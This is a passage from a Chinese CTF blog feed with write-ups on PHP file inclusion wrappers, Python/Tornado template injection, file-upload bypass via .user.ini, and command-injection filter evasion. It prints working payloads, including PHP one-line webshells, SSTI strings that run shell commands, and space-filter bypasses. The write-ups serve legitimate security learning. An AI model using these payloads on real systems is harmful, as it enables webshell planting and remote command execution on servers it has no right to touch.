src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315212029230.png" alt=""></p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>参考：<a href="https://www.leavesongs.com/search/?keyword=filter" target="_blank" rel="noopener">https://www.leavesongs.com/search/?keyword=filter</a></p><p>一种元封装器， 设计用于数据流打开时的<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">筛选过滤</a>应用。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507163438086.png" alt=""></p><p>读取文件：<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p><p>绕过exit</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">'&lt;?php exit; ?&gt;'</span>;</span><br><span class="line">$content .= $_POST[<span class="string">'txt'</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">'filename'</span>], $content);</span><br></pre></td></tr></table></figure><p>成功写马</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507174823081.png" alt=""></p><p><code>string.strip_tags</code>方法</p><p><strong><a href="https://www.php.net/manual/zh/filters.string.strip_tags.php" target="_blank" rel="noopener">string.strip_tags</a></strong>：使用此过滤器等同于用 <code>strip_tags()</code>函数处理所有的流数据。可以用两种格式接收参数：一种是和 <code>strip_tags()</code>函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。</p><p><strong><a href="https://www.php.net/manual/zh/function.strip-tags.php" target="_blank" rel="noopener">strip_tags()</a></strong>：从字符串中去除 HTML 和 PHP 标记</p><p><strong>ROT13</strong>方法</p><p>编码解码网站：<a href="https://cryptii.com/pipes/rot13-decoder" target="_blank" rel="noopener">https://cryptii.com/pipes/rot13-decoder</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507180852771.png" alt=""></p><h4 id="file-伪协议"><a href="#file-伪协议" class="headerlink" title="file://伪协议"></a>file://伪协议</h4><p>访问本地文件系统</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315212627490.png" alt=""></p><p>注：这里的文件路径需要本地文件的绝对路径</p><h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h4><p>用法：<code>data://text/plain;base64,</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); ===base64===&gt;  PD9waHAgcGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315213202734.png" alt=""></p><p>读取文件内容操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> show_source(<span class="string">'1.php'</span>); ===base64===&gt;   PD9waHAgc2hvd19zb3VyY2UoJzEucGhwJyk7</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315214340393.png" alt=""></p><h4 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h4><p>用法：<code>?a=phar://压缩包/内部文件 phar://xxx.png/shell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 </p><p>步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315215247124.png" alt=""></p><p>亦可写马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315215651827.png" alt=""></p><h4 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用法：<code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</code></p><p>条件： PHP &gt; =5.3.0， #在浏览器中要编码为%23</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315220043657.png" alt=""></p><p>亦可与上面的一样就行写马操作</p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="ZJCTF-2019—NiZhuanSiWei"><a href="#ZJCTF-2019—NiZhuanSiWei" class="headerlink" title="ZJCTF-2019—NiZhuanSiWei"></a>ZJCTF-2019—NiZhuanSiWei</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>file_get_contents</code>：将整个文件读入一个字符串</p><p>首先传入<code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>绕过第一个if</p><p>然后传入<code>file=php://filter/read=convert.base64-encode/resource=useless.php</code>读取<code>useless.php</code></p><p>base64解码后代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>随后再传入<code>password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>，包含<code>file=useless.php</code>即可得到flag</p><p>完整payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br><span class="line">file&#x3D;useless.php</span><br><span class="line">password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI</title>
      <link href="/2020/03/18/SSTI/"/>
      <url>/2020/03/18/SSTI/</url>
      
        <content type="html"><![CDATA[<h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><p>打开链接发现就一个这东西</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-81.png" alt=""></p><p>懵了，于是购买writeup进行学习：</p><p>发现该题是一个利用“Python SSTI”,“404模板注入”的原理</p><p>题目类型深度剖析移步大佬的文章：<a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">从零学习flask模板注入</a></p><p>方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><p>解题步骤：</p><p>1、测试是否存在SSTI：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;1+2&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-82.png" alt=""></p><p>事实证明存在SSTI</p><p>2、访问</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>来查看所有模块</p><p>3、os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个（我眼瞎了，不要问我为什么）</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-83.png" style="zoom:80%;" /><p>4、访问</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()&#125;&#125;</span><br></pre></td></tr></table></figure><p>查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-84.png" alt=""></p><p>5.使用[‘o’+’s’],可绕过对os字符的过滤，访问</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' )&#125;&#125;</span><br></pre></td></tr></table></figure><p>查看flag文件所在</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-85.png" alt=""></p><p>6、访问</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:46675/&#123; &#123;"".__class__.__mro__[2].__subclasses__()[40]("fl4g").read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>可得到flag，如图所示</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-86.png" alt=""></p><p><strong>writeup里的另外一种姿势：</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-87.png" alt=""></p><p><strong>另外，里面还有一种更骚的操作：</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-88.png" alt=""></p><p>这里用到了一个工具：<a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">tplmap</a></p><p>一个扫描服务器端模板注入漏洞的开源工具 ，需要自取</p><p>附上OS文件目录的方法： <a href="https://www.runoob.com/python/os-file-methods.html" target="_blank" rel="noopener">Python OS 文件/目录方法</a></p><h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="BJDCTF-2nd-fake google"></a>BJDCTF-2nd-fake google</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200324100426394.png" alt=""></p><p>随便输入测试后得到一以下结果，推测是SSTI</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200324100451322.png" alt=""></p><p>F12打开后发现提示果然是SSTI</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200324100534466.png" alt=""></p><p>测试后发现啥都没过滤，于是直接上payload：</p><p>payload1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('cd ..;ls;cat flag').read()"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'cat /flag | base64'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>命令执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('id').read()"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>文件操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'filename'</span>, <span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="护网杯 2018-easy_tornado"></a>护网杯 2018-easy_tornado</h3><p>题目界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200412112736253.png" alt=""></p><p>url格式：<code>http://70c4e22b-ffb9-4933-b754-737df58fec82.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=766846dacf2bd89cde918d880dd30d77</code></p><p>根据提示<code>flag</code>在<code>/fllllllllllllag</code>中，<code>hints</code>为<code>md5(cookie_secret+md5(filename))</code></p><p>观察url后推测出其中的关系<code>filehash=md5(cookie_secret+md5(filename))</code></p><p>也就是说<code>filename</code>有了，只需要拿到<code>cookie_secret</code>再经过<code>md5</code>换算后传入即可得到<code>flag</code></p><p>一种方法，根据已有的<code>filename</code>和<code>filehash</code>爆破出<code>cookie_secret</code>值，当然这种方法爆破不知道爆破到什么时候去了，随手测试后发现当<code>filename</code>和<code>filehash</code>不对应的时候有一个error页面</p><p>url格式：<code>http://70c4e22b-ffb9-4933-b754-737df58fec82.node3.buuoj.cn/error?msg=Error</code></p><p>测试<code>error?msg=1</code>发现有回显，应该存在模板注入</p><p>百度<code>reader</code>发现是<code>Tornado</code>框架中的一个渲染模板</p><p>参考：<a href="https://xz.aliyun.com/t/2908" target="_blank" rel="noopener">https://xz.aliyun.com/t/2908</a></p><p>通过<code>handler.application</code>可访问整个Tornado</p><p>通过<code></code>或者<code></code>就可获得<code>settings</code>中的<strong>cookie_secret</strong></p><p><code>/fllllllllllllag</code>md5加密后在前面加上<code>cookie_secret</code>再经过md5加密后的值再和<code>/fllllllllllllag</code>传入url中即可得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2020/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2020/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="2019SUCTF—CheckIn"><a href="#2019SUCTF—CheckIn" class="headerlink" title="2019SUCTF—CheckIn"></a>2019SUCTF—CheckIn</h3><p>题目源码：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p><p>复现链接：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><h4 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h4><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209103925041.png" alt=""></p><p>上传一句话.php文件，结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209104816676.png" alt=""></p><p>更改后缀和文件类型为图片格式，结果如下，过滤了<code>&lt;?</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209105358989.png" alt=""></p><p>用<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的图片马绕过，结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209105253270.png" alt=""></p><p>应该调用了后端的<code>exif_imagetype()</code>函数，于是添加文件头绕过<code>GIF89a</code>，上传成功</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209110003787.png" alt=""></p><p>到这一步应该想到上传一个<code>.htaccess</code>文件来将图片马解析为php，尝试无果，于是用到了下面的.user.ini文件</p><p>参考</p><blockquote><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p><p><a href="https://xz.aliyun.com/t/6091#toc-1" target="_blank" rel="noopener">从SUCTF 2019 CheckIn 浅谈.user.ini的利用</a></p></blockquote><h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="上传-uesr-ini文件"><a href="#上传-uesr-ini文件" class="headerlink" title="上传.uesr.ini文件"></a>上传.uesr.ini文件</h5><p>内容如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="attr">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209104439117.png" alt=""></p><blockquote><p>ini文件设置中有两个参数：<code>auto_prepend_file</code>和<code>auto_append_file</code></p><p>表示我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<code>require(./a.jpg);</code></p><p>两个设置的区别在于<strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p></blockquote><p>利用前提需要文件目录下有一个可执行的.php文件，而题目刚好有一个</p><h5 id="上传a-jpg图片马"><a href="#上传a-jpg图片马" class="headerlink" title="上传a.jpg图片马"></a>上传a.jpg图片马</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="D:%5CBlog%5Csource_posts%5C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5Cimage-20200209113304522.png" alt=""></p><p>访问index.php，用工具连接后台，在网站根目录下得到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209113410626.png" alt=""></p><p>也可以将图片马代码改成如下方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">'php'</span>&gt;system(<span class="string">'cat /flag'</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>直接访问index.php即可得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令注入</title>
      <link href="/2020/03/10/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/03/10/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="2019GXYCTF—Ping-Ping-Ping"><a href="#2019GXYCTF—Ping-Ping-Ping" class="headerlink" title="2019GXYCTF—Ping Ping Ping"></a>2019GXYCTF—Ping Ping Ping</h3><p>12月份的GWYCTF，BUUCTF上复现</p><p>别人学校招新的题目，我还是不会，太菜了</p><p>先来看看题目的界面</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-96.png" alt=""></p><p>由题意得，传参ip</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-97.png" alt=""></p><p>联想命令执行，命令执行的方法大致两种：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;：用于连续指令执行</span><br><span class="line">|：管道符，将左边的输出当做右边的输入，只返回右边的结果</span><br></pre></td></tr></table></figure><p>尝试分号：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-98.png" alt=""></p><p>发现目录下包含两个文件：index.php 和 flag.php</p><p>尝试cat查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-99.png" alt=""></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-100.png" alt=""></p><p>emmmmmmmmmmmmm空格被办了。。。</p><p>从大佬那学习绕过空格的方法，大概有以下几种：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">IFS</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">IFS<span class="variable">$1</span> //<span class="variable">$1</span>改成$加其他数字貌似都行</span></span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line"><span class="meta">%</span><span class="bash">20 </span></span><br><span class="line"><span class="meta">%</span><span class="bash">09</span></span><br></pre></td></tr></table></figure><p>各种尝试后发现$IFS$1有效，分别查看两个文件，如图：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-101.png" alt=""></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-102.png" alt=""></p><p>index.php代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 